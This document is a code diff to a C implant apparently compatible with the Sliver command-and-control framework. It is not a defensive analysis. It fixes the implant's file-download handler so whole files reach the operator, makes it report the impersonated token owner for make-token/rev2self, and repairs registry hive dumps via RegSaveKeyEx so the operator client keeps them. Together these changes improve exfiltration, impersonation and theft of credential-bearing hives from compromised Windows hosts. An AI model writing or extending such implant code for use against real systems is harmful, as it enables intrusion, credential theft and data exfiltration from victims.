@@ -236,10 +236,13 @@ int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out) {
 int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) {
   sliver_download_req_t dl;
   sliver_buf_t chunk;
-  int64_t limit = SLIVER_DOWNLOAD_CHUNK;
+  int64_t limit = SLIVER_DOWNLOAD_MAX_BYTES;
   int64_t stop = 0;
   int exists;
   int is_dir = 0;
+  int read_files = 0;
+  char errbuf[160];
+  const char *err = NULL;
   int rc;
 
   sliver_buf_init(&chunk);
@@ -247,12 +250,15 @@ int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) 
     return -1;
   }
   if (dl.start < 0) {
-    return sliver_download_encode(out, dl.path, 0, 0, 0, NULL, 0, 0,
+    return sliver_download_encode(out, dl.path, 0, 0, 0, NULL, 0, 0, 0,
                                   "download: negative offset");
   }
   exists = sliver_fs_exists(dl.path);
   is_dir = sliver_fs_is_dir(dl.path);
   if (exists && !is_dir) {
+    /* The session mode of the Go implant returns the whole file in one
+     * Download message (there is no chunked continuation on either side), so a
+     * 64 KiB read here silently truncated every larger file. */
     if (dl.stop > dl.start && dl.stop - dl.start < limit) {
       limit = dl.stop - dl.start;
     }
@@ -260,13 +266,31 @@ int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) 
     if (dl.max_bytes > 0 && dl.max_bytes < limit) {
       limit = dl.max_bytes;
     }
-    (void)sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk);
+    if (sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk) == 0) {
+      read_files = 1;
+      /* Report a cut file instead of handing the operator a truncated one. */
+      if ((int64_t)chunk.len >= limit) {
+        int64_t size = sliver_fs_size(dl.path);
+        if (size > (int64_t)chunk.len) {
+          (void)snprintf(errbuf, sizeof(errbuf),
+                         "download: file is %lld bytes, only the first %lld were sent "
+                         "(implant limit per message)",
+                         (long long)size, (long long)chunk.len);
+          err = errbuf;
+        }
+      }
+    } else {
+      err = "download: cannot read file";
+    }
     stop = dl.start + (int64_t)chunk.len;
   } else {
     stop = dl.start;
   }
+  if (err == NULL && !exists) {
+    err = "download: no such file";
+  }
   rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, is_dir,
-                              exists ? NULL : "download: no such file");
+                              read_files, err);
   sliver_buf_free(&chunk);
   return rc;
 }
@@ -416,8 +440,12 @@ int sliver_rpc_handle_token_owner(const sliver_envelope_t *req, sliver_buf_t *ou
   char user[256];
   (void)req;
   user[0] = 0;
-  if (sliver_username(user, sizeof(user)) != 0) {
-    (void)snprintf(user, sizeof(user), "%s", "unknown");
+  /* DOMAIN\user of the token in effect on this thread; the Go implant reports
+   * the same shape and it tracks make-token/rev2self. */
+  if (sliver_token_owner(user, sizeof(user)) != 0 || user[0] == '\0') {
+    if (sliver_username(user, sizeof(user)) != 0) {
+      (void)snprintf(user, sizeof(user), "%s", "unknown");
+    }
   }
   return sliver_current_token_owner_encode(out, user);
 }
@@ -1112,7 +1140,10 @@ static int handle_reg_read_hive(const sliver_envelope_t *req, sliver_buf_t *out)
     return sliver_reg_hive_encode(out, NULL, 0, NULL,
                                   "read-hive: RegSaveKeyEx failed (needs SeBackupPrivilege)");
   }
-  rc = sliver_reg_hive_encode(out, data, len, "raw", NULL);
+  /* Encoder "" tells the operator client the payload is a bare hive dump
+   * (client/command/registry/reg-read.go treats "raw" as an unknown encoder and
+   * throws the data away; the Go implant sends "gzip"). */
+  rc = sliver_reg_hive_encode(out, data, len, "", NULL);
   free(data);
   LOG_DEBUG("rpc: read-hive %s -> %u bytes", root, (unsigned)len);
   return rc;
@@ -1169,7 +1200,7 @@ static const rpc_entry_t g_handlers[] = {
     {130, 130, handle_services},
     {131, 131, handle_service_detail},
     {132, 132, handle_service_start},
-    {31, 31, handle_rev2self},
+    {31, SLIVER_MSG_REV_TO_SELF, handle_rev2self},
 #endif
 #if defined(_WIN32)
     {71, 71, handle_reg_read},
